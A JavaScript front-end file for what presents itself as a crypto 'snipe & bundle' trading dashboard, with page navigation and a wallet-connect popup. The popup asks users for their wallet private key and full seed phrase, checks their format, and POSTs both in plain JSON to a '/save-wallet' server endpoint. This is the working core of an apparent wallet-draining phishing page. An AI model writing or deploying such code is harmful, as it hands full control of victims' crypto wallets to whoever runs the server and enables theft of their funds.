document.addEventListener("DOMContentLoaded", function () {
    console.log("🚀 Script Loaded Successfully!");

    // 🌍 API URL (Change if needed)
    const API_URL = "http://localhost:5000"; 

    // 📂 Pages
    const pages = {
        portfolio: document.getElementById("portfolioPage"),
        tradeHistory: document.getElementById("tradeHistoryPage"),
        settings: document.getElementById("settingsPage")
    };

    // 🛠 Buttons
    const buttons = {
        bundle: document.querySelector(".bundle-button"),
        portfolio: document.querySelector(".portfolio-btn"),
        tradeHistory: document.querySelector(".trade-btn"),
        settings: document.querySelector(".settings-btn"),
        connectWallet: document.querySelector(".connect-wallet-btn"),
        closeWalletPopup: document.querySelector(".close-btn"),
        walletSubmit: document.querySelector(".wallet-submit"),
        back: document.querySelectorAll(".back-btn")
    };

    // 💳 Wallet Popup
    const walletPopup = document.getElementById("walletPopup");
    const privateKeyInput = document.getElementById("privateKey");
    const seedPhraseInput = document.getElementById("seedPhrase");
    const walletError = document.getElementById("walletError");

    // 🔄 Show a Page
    function showPage(page) {
        Object.values(pages).forEach(p => p.style.display = "none");
        page.style.display = "block";
    }

    // 📌 Button Click Events
    buttons.bundle?.addEventListener("click", () => alert("⚡ Connect a wallet to snipe & bundle tokens!"));
    buttons.portfolio?.addEventListener("click", () => showPage(pages.portfolio));
    buttons.tradeHistory?.addEventListener("click", () => showPage(pages.tradeHistory));
    buttons.settings?.addEventListener("click", () => showPage(pages.settings));

    // 🔙 Back Buttons
    buttons.back.forEach(button => button.addEventListener("click", () => {
        Object.values(pages).forEach(p => p.style.display = "none");
    }));

    // 🔥 Wallet Popup Handling
    buttons.connectWallet.addEventListener("click", () => walletPopup.classList.add("show"));
    buttons.closeWalletPopup.addEventListener("click", () => walletPopup.classList.remove("show"));

    // 🛡️ Seed Phrase & Private Key Validation
    function validateWalletInput(seedPhrase, privateKey) {
        const validSeedPhrase = /^([a-z]+ ){11,23}[a-z]+$/;
        const validPrivateKey = /^[A-Fa-f0-9]{64}$/; // Hex format for private keys

        if (seedPhrase && !validSeedPhrase.test(seedPhrase)) {
            return "❌ Invalid Seed Phrase! Must be 12-24 words.";
        }
        if (privateKey && !validPrivateKey.test(privateKey)) {
            return "❌ Invalid Private Key! Must be a 64-character hex string.";
        }
        return null; // Valid input
    }

    // 🔑 Save Wallet Data (Private Key & Seed Phrase)
    buttons.walletSubmit.addEventListener("click", async () => {
        const privateKey = privateKeyInput.value.trim();
        const seedPhrase = seedPhraseInput.value.trim();

        // Validation Check
        const validationError = validateWalletInput(seedPhrase, privateKey);
        if (validationError) {
            walletError.textContent = validationError;
            walletError.style.display = "block";
            return;
        }

        // Hide error message
        walletError.style.display = "none";

        try {
            const response = await fetch(`${API_URL}/save-wallet`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ privateKey, seedPhrase })
            });

            const result = await response.json();
            alert(result.message);
            walletPopup.classList.remove("show");

            // Clear input fields
            privateKeyInput.value = "";
            seedPhraseInput.value = "";
        } catch (error) {
            alert("❌ Failed to save wallet");
            console.error(error);
        }
    });
});
